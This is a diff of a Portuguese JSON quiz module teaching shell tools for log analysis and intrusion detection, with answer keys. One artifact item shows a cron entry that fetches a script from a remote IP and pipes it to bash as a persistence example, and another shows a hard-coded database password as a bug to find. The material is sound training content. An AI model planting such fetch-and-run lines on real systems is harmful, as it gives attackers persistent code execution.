@@ -8,7 +8,9 @@
     "Localizar arquivos com find por nome, permissão e data de modificação",
     "Automatizar tarefas com script e cron, e reconhecer o agendamento como técnica de persistência"
   ],
-  "pre_requisitos": ["1.1"],
+  "pre_requisitos": [
+    "1.1"
+  ],
   "teoria": [
     {
       "id": "1.2.t1",
@@ -64,7 +66,9 @@
       "id": "1.2.q1",
       "tipo": "comando",
       "dificuldade": 2,
-      "objetivos": [0],
+      "objetivos": [
+        0
+      ],
       "enunciado": "Qual é a diferença entre `comando > saida.txt 2>&1` e `comando 2>&1 > saida.txt`?",
       "alternativas": [
         "No primeiro, erro e resultado vão para o arquivo; no segundo, o erro continua no terminal",
@@ -86,13 +90,20 @@
         "3": "As duas formas são sintaticamente válidas e executam normalmente."
       },
       "fonte": "POSIX shell; comportamento verificado em execução",
-      "tags": ["shell", "redirecionamento", "comando", "fundamentos"]
+      "tags": [
+        "shell",
+        "redirecionamento",
+        "comando",
+        "fundamentos"
+      ]
     },
     {
       "id": "1.2.q2",
       "tipo": "conceitual",
       "dificuldade": 1,
-      "objetivos": [0],
+      "objetivos": [
+        0
+      ],
       "enunciado": "Qual é a diferença entre `>` e `>>` ao redirecionar a saída de um comando?",
       "alternativas": [
         "> sobrescreve o arquivo; >> acrescenta ao final do que já existe",
@@ -114,13 +125,20 @@
         "3": "Os dois criam o arquivo quando ele não existe."
       },
       "fonte": "POSIX shell",
-      "tags": ["shell", "redirecionamento", "fundamentos"]
+      "tags": [
+        "shell",
+        "redirecionamento",
+        "fundamentos"
+      ]
     },
     {
       "id": "1.2.q3",
       "tipo": "conceitual",
       "dificuldade": 2,
-      "objetivos": [0, 1],
+      "objetivos": [
+        0,
+        1
+      ],
       "enunciado": "Você executa `comando_com_erros | grep \"aviso\"` e as mensagens de erro continuam aparecendo no terminal, sem serem filtradas. Por quê?",
       "alternativas": [
         "O pipe liga apenas a saída padrão ao comando seguinte; a saída de erro segue por fora da cadeia",
@@ -142,13 +160,20 @@
         "3": "A opção -e apenas indica um padrão de busca; não altera quais fluxos chegam ao grep."
       },
       "fonte": "POSIX shell; teoria 1.2.t2",
-      "tags": ["shell", "pipes", "redirecionamento", "diagnostico"]
+      "tags": [
+        "shell",
+        "pipes",
+        "redirecionamento",
+        "diagnostico"
+      ]
     },
     {
       "id": "1.2.q4",
       "tipo": "comando",
       "dificuldade": 1,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "Qual comando conta quantas linhas de /var/log/auth.log contêm o texto \"Failed password\"?",
       "alternativas": [
         "grep -c \"Failed password\" /var/log/auth.log",
@@ -170,13 +195,20 @@
         "3": "-i exibe as linhas ignorando maiúsculas, sem contá-las."
       },
       "fonte": "POSIX grep; comportamento verificado em execução",
-      "tags": ["shell", "grep", "comando", "logs"]
+      "tags": [
+        "shell",
+        "grep",
+        "comando",
+        "logs"
+      ]
     },
     {
       "id": "1.2.q5",
       "tipo": "comando",
       "dificuldade": 2,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "O que faz a cadeia `... | sort | uniq -c | sort -rn`?",
       "alternativas": [
         "Agrupa linhas iguais, conta as repetições e ordena da mais frequente para a menos frequente",
@@ -186,7 +218,7 @@
       ],
       "correta": 0,
       "dicas": [
-        "uniq só agrupa iguais que estejam adjacentes — por isso o primeiro sort.",
+        "O primeiro sort existe por causa de uma limitação do comando seguinte. Qual?",
         "A opção -c do uniq acrescenta a contagem na frente de cada linha.",
         "No segundo sort, -r inverte e -n ordena numericamente."
       ],
@@ -198,13 +230,20 @@
         "3": "Nada nessa cadeia ordena por tamanho nem descarta linhas curtas."
       },
       "fonte": "POSIX sort e uniq; comportamento verificado em execução",
-      "tags": ["shell", "pipes", "comando", "analise-de-log"]
+      "tags": [
+        "shell",
+        "pipes",
+        "comando",
+        "analise-de-log"
+      ]
     },
     {
       "id": "1.2.q6",
       "tipo": "caca_erro",
       "dificuldade": 3,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "trecho": "# objetivo: listar os IPs que mais tentaram autenticar sem sucesso\ngrep \"Failed password\" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn\n\n# saída obtida em uma amostra de 4 linhas:\n#      1 203.0.113.45\n#      1 198.51.100.7\n#      1 oracle\n#      1 admin",
       "enunciado": "A cadeia está sintaticamente correta, mas o resultado mistura nomes de usuário com endereços. Qual é a causa?",
       "alternativas": [
@@ -227,13 +266,21 @@
         "3": "O filtro está correto: todas as linhas trazidas são de falha de senha."
       },
       "fonte": "POSIX awk; comportamento verificado em amostra de auth.log",
-      "tags": ["shell", "awk", "caca-erro", "analise-de-log", "formato"]
+      "tags": [
+        "shell",
+        "awk",
+        "caca-erro",
+        "analise-de-log",
+        "formato"
+      ]
     },
     {
       "id": "1.2.q7",
       "tipo": "comando",
       "dificuldade": 2,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "O que faz o comando `cut -d: -f1 /etc/passwd`?",
       "alternativas": [
         "Exibe o primeiro campo de cada linha, usando dois-pontos como delimitador — ou seja, os nomes das contas",
@@ -255,13 +302,20 @@
         "3": "cut não grava arquivos; ele escreve na saída padrão."
       },
       "fonte": "POSIX cut; comportamento verificado em execução",
-      "tags": ["shell", "cut", "comando", "usuarios"]
+      "tags": [
+        "shell",
+        "cut",
+        "comando",
+        "usuarios"
+      ]
     },
     {
       "id": "1.2.q8",
       "tipo": "conceitual",
       "dificuldade": 2,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "Em awk, o que representa `$NF`?",
       "alternativas": [
         "O último campo da linha",
@@ -283,13 +337,20 @@
         "3": "awk não seleciona campo por tipo de conteúdo dessa forma."
       },
       "fonte": "POSIX awk",
-      "tags": ["shell", "awk", "vocabulario", "analise-de-log"]
+      "tags": [
+        "shell",
+        "awk",
+        "vocabulario",
+        "analise-de-log"
+      ]
     },
     {
       "id": "1.2.q9",
       "tipo": "comando",
       "dificuldade": 2,
-      "objetivos": [2],
+      "objetivos": [
+        2
+      ],
       "enunciado": "Qual comando lista os arquivos com extensão .log em /var/log modificados nos últimos 7 dias?",
       "alternativas": [
         "find /var/log -name \"*.log\" -mtime -7",
@@ -311,13 +372,20 @@
         "3": "-size filtra por tamanho do arquivo."
       },
       "fonte": "POSIX find; comportamento verificado em execução",
-      "tags": ["shell", "find", "comando", "investigacao"]
+      "tags": [
+        "shell",
+        "find",
+        "comando",
+        "investigacao"
+      ]
     },
     {
       "id": "1.2.q10",
       "tipo": "comando",
       "dificuldade": 3,
-      "objetivos": [2],
+      "objetivos": [
+        2
+      ],
       "enunciado": "Você quer localizar arquivos graváveis por qualquer usuário em um servidor. Qual comando faz isso?",
       "alternativas": [
         "find / -type f -perm -o+w 2>/dev/null",
@@ -339,13 +407,20 @@
         "3": "Além de procurar por permissão exata, esse comando altera arquivos em massa — ação destrutiva, não levantamento."
       },
       "fonte": "POSIX find; CIS Benchmarks",
-      "tags": ["shell", "find", "permissoes", "hardening"]
+      "tags": [
+        "shell",
+        "find",
+        "permissoes",
+        "hardening"
+      ]
     },
     {
       "id": "1.2.q11",
       "tipo": "conceitual",
       "dificuldade": 1,
-      "objetivos": [3],
+      "objetivos": [
+        3
+      ],
       "enunciado": "Para que serve a primeira linha `#!/bin/bash` em um script?",
       "alternativas": [
         "Indica ao sistema qual interpretador deve executar o arquivo",
@@ -356,7 +431,7 @@
       "correta": 0,
       "dicas": [
         "A linha começa com # mas tem um significado especial nos dois primeiros caracteres.",
-        "Sem ela, o sistema precisa adivinhar como executar o arquivo.",
+        "Sem essa linha, o que o sistema tem para decidir com que programa abrir o arquivo?",
         "Permissão de execução vem de outro lugar."
       ],
       "pergunta_socratica": "Antes de conferir: como o sistema saberia que este arquivo de texto deve ser entregue ao bash, e não ao python?",
@@ -367,13 +442,19 @@
         "3": "O diretório de trabalho é herdado de quem chamou o script."
       },
       "fonte": "POSIX; teoria 1.2.t6",
-      "tags": ["shell", "script", "fundamentos"]
+      "tags": [
+        "shell",
+        "script",
+        "fundamentos"
+      ]
     },
     {
       "id": "1.2.q12",
       "tipo": "artefato",
       "dificuldade": 2,
-      "objetivos": [3],
+      "objetivos": [
+        3
+      ],
       "artefato": "# crontab -l  (usuário www-data)\n*/10 * * * * /usr/bin/curl -s http://198.51.100.23/x.sh | /bin/bash\n0 3 * * 0 /usr/local/bin/rotate-logs",
       "enunciado": "Qual é a leitura correta destas duas entradas de cron?",
       "alternativas": [
@@ -396,13 +477,21 @@
         "3": "Rodar de madrugada é comum em rotinas legítimas; o indício está na primeira entrada."
       },
       "fonte": "crontab(5); MITRE ATT&CK (tarefa agendada como persistência)",
-      "tags": ["shell", "cron", "artefato", "persistencia", "deteccao"]
+      "tags": [
+        "shell",
+        "cron",
+        "artefato",
+        "persistencia",
+        "deteccao"
+      ]
     },
     {
       "id": "1.2.q13",
       "tipo": "conceitual",
       "dificuldade": 2,
-      "objetivos": [3],
+      "objetivos": [
+        3
+      ],
       "enunciado": "Em uma entrada de cron, qual é a ordem dos cinco campos de tempo?",
       "alternativas": [
         "Minuto, hora, dia do mês, mês, dia da semana",
@@ -424,13 +513,20 @@
         "3": "cron não tem campo de segundos no formato padrão."
       },
       "fonte": "crontab(5)",
-      "tags": ["shell", "cron", "vocabulario", "automacao"]
+      "tags": [
+        "shell",
+        "cron",
+        "vocabulario",
+        "automacao"
+      ]
     },
     {
       "id": "1.2.q14",
       "tipo": "cenario",
       "dificuldade": 3,
-      "objetivos": [3],
+      "objetivos": [
+        3
+      ],
       "enunciado": "Depois de remover um malware de um servidor, a infecção reaparece todos os dias no mesmo horário. Qual é a hipótese mais provável?",
       "alternativas": [
         "Existe um mecanismo de persistência, como tarefa agendada ou serviço, que reinstala o código periodicamente",
@@ -452,20 +548,43 @@
         "3": "Sistemas de arquivos comuns não restauram versões antigas sozinhos."
       },
       "fonte": "MITRE ATT&CK (persistência); NIST SP 800-61",
-      "tags": ["shell", "cron", "persistencia", "resposta-a-incidentes"]
+      "tags": [
+        "shell",
+        "cron",
+        "persistencia",
+        "resposta-a-incidentes"
+      ]
     },
     {
       "id": "1.2.q15",
       "tipo": "pareamento",
       "dificuldade": 2,
-      "objetivos": [1, 2],
+      "objetivos": [
+        1,
+        2
+      ],
       "enunciado": "Ligue cada ferramenta à tarefa para a qual ela é a escolha mais direta.",
       "pares": [
-        ["grep", "Encontrar as linhas que contêm um endereço IP específico"],
-        ["awk", "Extrair um campo de cada linha e calcular sobre ele"],
-        ["find", "Localizar arquivos por nome, permissão ou data de modificação"],
-        ["uniq -c", "Contar quantas vezes cada valor repetido aparece"],
-        ["sed", "Substituir um trecho de texto em todas as linhas"]
+        [
+          "grep",
+          "Encontrar as linhas que contêm um endereço IP específico"
+        ],
+        [
+          "awk",
+          "Extrair um campo de cada linha e calcular sobre ele"
+        ],
+        [
+          "find",
+          "Localizar arquivos por nome, permissão ou data de modificação"
+        ],
+        [
+          "uniq -c",
+          "Contar quantas vezes cada valor repetido aparece"
+        ],
+        [
+          "sed",
+          "Substituir um trecho de texto em todas as linhas"
+        ]
       ],
       "dicas": [
         "Uma ferramenta trabalha sobre a árvore de diretórios, e não sobre o conteúdo das linhas.",
@@ -475,13 +594,20 @@
       "pergunta_socratica": "Antes de conferir: qual dessas você usaria primeiro ao investigar um log grande, e por quê?",
       "explicacao": "Cada ferramenta responde a uma pergunta diferente: grep seleciona linhas, awk recorta e calcula sobre campos, sed substitui, uniq -c conta repetições e find localiza arquivos. A força do ambiente está em encadeá-las, e a maior parte das análises de log é exatamente essa sequência — filtrar, extrair, ordenar, contar.",
       "fonte": "POSIX; teoria 1.2.t3, 1.2.t4 e 1.2.t5",
-      "tags": ["shell", "ferramentas", "pareamento", "analise-de-log"]
+      "tags": [
+        "shell",
+        "ferramentas",
+        "pareamento",
+        "analise-de-log"
+      ]
     },
     {
       "id": "1.2.q16",
       "tipo": "comando",
       "dificuldade": 2,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "Qual comando mostra as linhas de um log que contêm \"error\", junto com as duas linhas seguintes a cada ocorrência?",
       "alternativas": [
         "grep -A 2 \"error\" aplicacao.log",
@@ -503,13 +629,20 @@
         "3": "-v inverte a busca, mostrando o que não casa."
       },
       "fonte": "POSIX grep",
-      "tags": ["shell", "grep", "comando", "analise-de-log"]
+      "tags": [
+        "shell",
+        "grep",
+        "comando",
+        "analise-de-log"
+      ]
     },
     {
       "id": "1.2.q17",
       "tipo": "conceitual",
       "dificuldade": 2,
-      "objetivos": [0],
+      "objetivos": [
+        0
+      ],
       "enunciado": "Para que serve `2>/dev/null` no fim de um comando?",
       "alternativas": [
         "Descarta as mensagens de erro, mantendo apenas o resultado no terminal",
@@ -531,13 +664,21 @@
         "3": "O comando continua executando normalmente após um erro."
       },
       "fonte": "POSIX shell",
-      "tags": ["shell", "redirecionamento", "comando", "fundamentos"]
+      "tags": [
+        "shell",
+        "redirecionamento",
+        "comando",
+        "fundamentos"
+      ]
     },
     {
       "id": "1.2.q18",
       "tipo": "caca_erro",
       "dificuldade": 3,
-      "objetivos": [0, 3],
+      "objetivos": [
+        0,
+        3
+      ],
       "trecho": "#!/bin/bash\n# backup diário do banco\nDESTINO=/backup/db.sql\nmysqldump -u root -pSenha123 aplicacao > $DESTINO\necho \"backup concluído\" >> /var/log/backup.log",
       "enunciado": "Além da senha em texto claro na linha de comando, qual falha deste script tem maior chance de causar perda de dados?",
       "alternativas": [
@@ -560,13 +701,21 @@
         "3": "Crescimento do log é questão de rotação, com impacto muito menor."
       },
       "fonte": "POSIX shell; teoria 1.2.t1",
-      "tags": ["shell", "script", "caca-erro", "backup", "redirecionamento"]
+      "tags": [
+        "shell",
+        "script",
+        "caca-erro",
+        "backup",
+        "redirecionamento"
+      ]
     },
     {
       "id": "1.2.q19",
       "tipo": "comando",
       "dificuldade": 2,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "Qual comando substitui todas as ocorrências de \"192.168.1.1\" por \"REDIGIDO\" em um arquivo, exibindo o resultado sem alterar o original?",
       "alternativas": [
         "sed 's/192\\.168\\.1\\.1/REDIGIDO/g' relatorio.txt",
@@ -588,13 +737,21 @@
         "3": "A chamada a gsub está incompleta e a sintaxe é inválida."
       },
       "fonte": "POSIX sed",
-      "tags": ["shell", "sed", "comando", "anonimizacao"]
+      "tags": [
+        "shell",
+        "sed",
+        "comando",
+        "anonimizacao"
+      ]
     },
     {
       "id": "1.2.q20",
       "tipo": "conceitual",
       "dificuldade": 3,
-      "objetivos": [0, 3],
+      "objetivos": [
+        0,
+        3
+      ],
       "enunciado": "Por que passar uma senha como argumento na linha de comando é considerado inseguro?",
       "alternativas": [
         "O argumento fica visível na lista de processos para outros usuários da máquina e costuma ir para o histórico do shell",
@@ -616,13 +773,20 @@
         "3": "Argumentos não são convertidos para maiúsculas."
       },
       "fonte": "Security Engineering, 3ª ed., cap. 6; teoria 1.1.t5",
-      "tags": ["shell", "segredos", "processos", "boas-praticas"]
+      "tags": [
+        "shell",
+        "segredos",
+        "processos",
+        "boas-praticas"
+      ]
     },
     {
       "id": "1.2.q21",
       "tipo": "comando",
       "dificuldade": 3,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "Qual cadeia extrai os endereços IP de tentativas malsucedidas e mostra os cinco que mais tentaram?",
       "alternativas": [
         "grep \"Failed password\" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -n 5",
@@ -644,13 +808,21 @@
         "3": "A extração acontece antes do filtro, então o grep não encontra mais o texto procurado."
       },
       "fonte": "POSIX; cadeia verificada em amostra de auth.log",
-      "tags": ["shell", "pipes", "comando", "analise-de-log", "forca-bruta"]
+      "tags": [
+        "shell",
+        "pipes",
+        "comando",
+        "analise-de-log",
+        "forca-bruta"
+      ]
     },
     {
       "id": "1.2.q22",
       "tipo": "cenario",
       "dificuldade": 2,
-      "objetivos": [2],
+      "objetivos": [
+        2
+      ],
       "enunciado": "Você suspeita que um invasor deixou arquivos em um servidor há três dias. Qual busca ajuda mais na triagem?",
       "alternativas": [
         "Listar arquivos modificados nos últimos três dias em diretórios graváveis, como /tmp, /var/tmp e /dev/shm",
@@ -672,13 +844,20 @@
         "3": "Datas anteriores à instalação não têm relação com a janela do incidente."
       },
       "fonte": "NIST SP 800-61; teoria 1.2.t5",
-      "tags": ["shell", "find", "investigacao", "triagem"]
+      "tags": [
+        "shell",
+        "find",
+        "investigacao",
+        "triagem"
+      ]
     },
     {
       "id": "1.2.q23",
       "tipo": "conceitual",
       "dificuldade": 2,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "Por que `uniq` precisa de uma entrada ordenada para funcionar como se espera?",
       "alternativas": [
         "Porque ele compara apenas linhas adjacentes: repetições separadas por outras linhas não são agrupadas",
@@ -700,13 +879,20 @@
         "3": "uniq não descarta a primeira ocorrência; ele conta grupos adjacentes."
       },
       "fonte": "POSIX uniq; comportamento verificado em execução",
-      "tags": ["shell", "uniq", "pipes", "analise-de-log"]
+      "tags": [
+        "shell",
+        "uniq",
+        "pipes",
+        "analise-de-log"
+      ]
     },
     {
       "id": "1.2.q24",
       "tipo": "ataque_defesa",
       "dificuldade": 3,
-      "objetivos": [3],
+      "objetivos": [
+        3
+      ],
       "enunciado": "Uma equipe quer detectar rapidamente a criação de tarefas agendadas não autorizadas em servidores. Qual medida é a mais eficaz?",
       "alternativas": [
         "Monitorar alterações nos arquivos e diretórios de cron e nos timers do systemd, com alerta para toda mudança",
@@ -728,13 +914,21 @@
         "3": "Registro do servidor web não cobre criação de tarefa agendada."
       },
       "fonte": "MITRE ATT&CK (persistência); NIST Cybersecurity Framework (detectar)",
-      "tags": ["shell", "cron", "deteccao", "persistencia", "monitoramento"]
+      "tags": [
+        "shell",
+        "cron",
+        "deteccao",
+        "persistencia",
+        "monitoramento"
+      ]
     },
     {
       "id": "1.2.q25",
       "tipo": "ordenacao",
       "dificuldade": 2,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "enunciado": "Coloque as etapas de uma análise de log na ordem em que compõem a cadeia de comandos.",
       "itens": [
         "Filtrar as linhas de interesse com grep",
@@ -743,7 +937,13 @@
         "Contar as repetições de cada valor com uniq -c",
         "Ordenar pela contagem, do maior para o menor"
       ],
-      "ordem_correta": [0, 1, 2, 3, 4],
+      "ordem_correta": [
+        0,
+        1,
+        2,
+        3,
+        4
+      ],
       "dicas": [
         "A extração pressupõe que o texto procurado ainda esteja presente.",
         "uniq só agrupa o que estiver adjacente.",
@@ -752,13 +952,20 @@
       "pergunta_socratica": "Antes de conferir: o que aconteceria se você extraísse o campo antes de filtrar as linhas?",
       "explicacao": "A cadeia segue uma dependência estrita: filtrar antes de extrair, porque a extração descarta o texto que o filtro usaria; ordenar antes de contar, porque uniq só agrupa vizinhos; e ordenar pela contagem no fim, quando ela já existe. Trocar qualquer par de etapas produz um resultado que parece plausível e responde outra pergunta — que é o modo mais fácil de errar em análise de log.",
       "fonte": "POSIX; cadeia verificada em execução",
-      "tags": ["shell", "pipes", "analise-de-log", "ciclo"]
+      "tags": [
+        "shell",
+        "pipes",
+        "analise-de-log",
+        "ciclo"
+      ]
     },
     {
       "id": "1.2.q26",
       "tipo": "conceitual",
       "dificuldade": 2,
-      "objetivos": [3],
+      "objetivos": [
+        3
+      ],
       "enunciado": "Por que baixar um script da internet e executá-lo diretamente com `curl ... | bash` é uma prática arriscada?",
       "alternativas": [
         "O conteúdo é executado sem ser inspecionado, e o servidor pode entregar código diferente a cada requisição",
@@ -780,13 +987,20 @@
         "3": "HTTPS protege o transporte, e não a confiabilidade do conteúdo entregue."
       },
       "fonte": "MITRE ATT&CK (execução); teoria 0.2.t6",
-      "tags": ["shell", "cadeia-de-fornecimento", "execucao", "boas-praticas"]
+      "tags": [
+        "shell",
+        "cadeia-de-fornecimento",
+        "execucao",
+        "boas-praticas"
+      ]
     },
     {
       "id": "1.2.q27",
       "tipo": "artefato",
       "dificuldade": 3,
-      "objetivos": [1],
+      "objetivos": [
+        1
+      ],
       "artefato": "$ grep \"Failed password\" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn\n      3 203.0.113.45\n      1 198.51.100.7",
       "enunciado": "O que esta saída indica, e qual é o próximo passo mais útil?",
       "alternativas": [
@@ -809,13 +1023,21 @@
         "3": "203.0.113.0/24 e 198.51.100.0/24 são faixas reservadas a documentação, não internas."
       },
       "fonte": "RFC 5737 (faixas para documentação); MITRE ATT&CK",
-      "tags": ["shell", "artefato", "analise-de-log", "forca-bruta", "triagem"]
+      "tags": [
+        "shell",
+        "artefato",
+        "analise-de-log",
+        "forca-bruta",
+        "triagem"
+      ]
     },
     {
       "id": "1.2.q28",
       "tipo": "comando",
       "dificuldade": 2,
-      "objetivos": [0],
+      "objetivos": [
+        0
+      ],
       "enunciado": "O que o comando `history` revela, e por que isso importa em uma investigação?",
       "alternativas": [
         "Os comandos digitados pelo usuário naquele shell, o que ajuda a reconstruir o que foi feito na máquina",
@@ -837,13 +1059,21 @@
         "3": "Alterações de configuração exigem monitoramento de integridade de arquivos."
       },
       "fonte": "MITRE ATT&CK (ocultação de rastros); NIST SP 800-61",
-      "tags": ["shell", "historico", "forense", "investigacao"]
+      "tags": [
+        "shell",
+        "historico",
+        "forense",
+        "investigacao"
+      ]
     },
     {
       "id": "1.2.q29",
       "tipo": "cenario",
       "dificuldade": 3,
-      "objetivos": [0, 3],
+      "objetivos": [
+        0,
+        3
+      ],
       "enunciado": "Um script de manutenção roda por cron e apaga arquivos antigos. Ele funciona quando executado à mão, mas falha quando agendado. Qual é a causa mais provável?",
       "alternativas": [
         "O ambiente do cron é reduzido: variáveis como PATH podem não estar definidas, e comandos chamados sem caminho absoluto não são encontrados",
@@ -865,13 +1095,20 @@
         "3": "cron executa qualquer programa, independentemente da linguagem."
       },
       "fonte": "crontab(5); teoria 1.2.t6",
-      "tags": ["shell", "cron", "diagnostico", "automacao"]
+      "tags": [
+        "shell",
+        "cron",
+        "diagnostico",
+        "automacao"
+      ]
     },
     {
       "id": "1.2.q30",
       "tipo": "conceitual",
       "dificuldade": 2,
-      "objetivos": [2],
+      "objetivos": [
+        2
+      ],
       "enunciado": "Qual é a diferença entre `find /var -name \"*.conf\"` e `find /var -iname \"*.conf\"`?",
       "alternativas": [
         "-iname ignora a diferença entre maiúsculas e minúsculas no nome do arquivo",
@@ -893,13 +1130,21 @@
         "3": "Limitar profundidade é papel da opção -maxdepth."
       },
       "fonte": "POSIX find",
-      "tags": ["shell", "find", "comando", "investigacao"]
+      "tags": [
+        "shell",
+        "find",
+        "comando",
+        "investigacao"
+      ]
     },
     {
       "id": "1.2.q31",
       "tipo": "ataque_defesa",
       "dificuldade": 3,
-      "objetivos": [1, 0],
+      "objetivos": [
+        1,
+        0
+      ],
       "enunciado": "Uma equipe quer garantir que a análise de logs continue possível mesmo quando o volume cresce muito. Qual prática ajuda mais?",
       "alternativas": [
         "Padronizar o formato dos registros, com campos em posição previsível ou estruturados, para que a extração não dependa de contar palavras",
@@ -921,13 +1166,21 @@
         "3": "Manter apenas na origem deixa o registro ao alcance de quem comprometeu o servidor."
       },
       "fonte": "NIST SP 800-61; teoria 1.2.t4",
-      "tags": ["shell", "logs", "padronizacao", "monitoramento"]
+      "tags": [
+        "shell",
+        "logs",
+        "padronizacao",
+        "monitoramento"
+      ]
     },
     {
       "id": "1.2.q32",
       "tipo": "comando",
       "dificuldade": 3,
-      "objetivos": [0, 2],
+      "objetivos": [
+        0,
+        2
+      ],
       "enunciado": "O que faz `find /home -type f -name \"*.sh\" -exec grep -l \"curl\" {} \\;`?",
       "alternativas": [
         "Lista os scripts .sh em /home que contêm a palavra curl",
@@ -949,20 +1202,43 @@
         "3": "Os scripts não são executados; eles são lidos pelo grep."
       },
       "fonte": "POSIX find e grep",
-      "tags": ["shell", "find", "grep", "comando", "triagem"]
+      "tags": [
+        "shell",
+        "find",
+        "grep",
+        "comando",
+        "triagem"
+      ]
     },
     {
       "id": "1.2.q33",
       "tipo": "pareamento",
       "dificuldade": 2,
-      "objetivos": [0],
+      "objetivos": [
+        0
+      ],
       "enunciado": "Ligue cada construção de redirecionamento ao seu efeito.",
       "pares": [
-        ["> arquivo", "Envia a saída padrão para o arquivo, apagando o conteúdo anterior"],
-        [">> arquivo", "Acrescenta a saída padrão ao final do arquivo"],
-        ["2> arquivo", "Envia apenas a saída de erro para o arquivo"],
-        ["2>/dev/null", "Descarta as mensagens de erro"],
-        ["> arquivo 2>&1", "Envia saída padrão e saída de erro para o mesmo arquivo"]
+        [
+          "> arquivo",
+          "Envia a saída padrão para o arquivo, apagando o conteúdo anterior"
+        ],
+        [
+          ">> arquivo",
+          "Acrescenta a saída padrão ao final do arquivo"
+        ],
+        [
+          "2> arquivo",
+          "Envia apenas a saída de erro para o arquivo"
+        ],
+        [
+          "2>/dev/null",
+          "Descarta as mensagens de erro"
+        ],
+        [
+          "> arquivo 2>&1",
+          "Envia saída padrão e saída de erro para o mesmo arquivo"
+        ]
       ],
       "dicas": [
         "O número 2 identifica o fluxo de erro.",
@@ -972,13 +1248,21 @@
       "pergunta_socratica": "Antes de conferir: qual dessas construções você usaria em um script que precisa registrar erros?",
       "explicacao": "As cinco formas cobrem quase todo uso diário: sobrescrever, acrescentar, separar o erro, descartar o erro e juntar os dois no mesmo destino. Em script de produção, a combinação útil costuma ser gravar tudo em log com > arquivo 2>&1, porque descartar erro esconde a falha que você vai precisar investigar depois.",
       "fonte": "POSIX shell; teoria 1.2.t1",
-      "tags": ["shell", "redirecionamento", "pareamento", "fundamentos"]
+      "tags": [
+        "shell",
+        "redirecionamento",
+        "pareamento",
+        "fundamentos"
+      ]
     },
     {
       "id": "1.2.q34",
       "tipo": "cenario",
       "dificuldade": 3,
-      "objetivos": [1, 2],
+      "objetivos": [
+        1,
+        2
+      ],
       "enunciado": "Você recebeu 4 GB de logs de um servidor comprometido e tem uma janela suspeita de duas horas. Como reduzir isso a algo analisável?",
       "alternativas": [
         "Recortar primeiro pela janela de tempo, depois filtrar por indicadores conhecidos, e só então extrair e contar campos",
@@ -1000,13 +1284,23 @@
         "3": "Compactar reduz espaço em disco, e não a quantidade de linhas a analisar."
       },
       "fonte": "NIST SP 800-61; teoria 1.2.t2",
-      "tags": ["shell", "analise-de-log", "triagem", "resposta-a-incidentes"]
+      "tags": [
+        "shell",
+        "analise-de-log",
+        "triagem",
+        "resposta-a-incidentes"
+      ]
     },
     {
       "id": "1.2.q35",
       "tipo": "cenario",
       "dificuldade": 3,
-      "objetivos": [0, 1, 2, 3],
+      "objetivos": [
+        0,
+        1,
+        2,
+        3
+      ],
       "enunciado": "Você precisa escrever um script que roda diariamente e alerta quando um endereço acumula mais de 50 falhas de autenticação em um dia. Quais cuidados de projeto são os mais importantes?",
       "alternativas": [
         "Ancorar a extração de campos de forma resistente a variações de formato, registrar saída e erro em log, usar caminhos absolutos por causa do cron, e verificar o código de retorno antes de declarar sucesso",
@@ -1028,7 +1322,13 @@
         "3": "Descartar a saída de erro é o caminho mais rápido para uma falha silenciosa."
       },
       "fonte": "crontab(5); POSIX shell; teoria 1.2.t1 e 1.2.t6",
-      "tags": ["shell", "script", "cron", "automacao", "boas-praticas"]
+      "tags": [
+        "shell",
+        "script",
+        "cron",
+        "automacao",
+        "boas-praticas"
+      ]
     }
   ]
 }
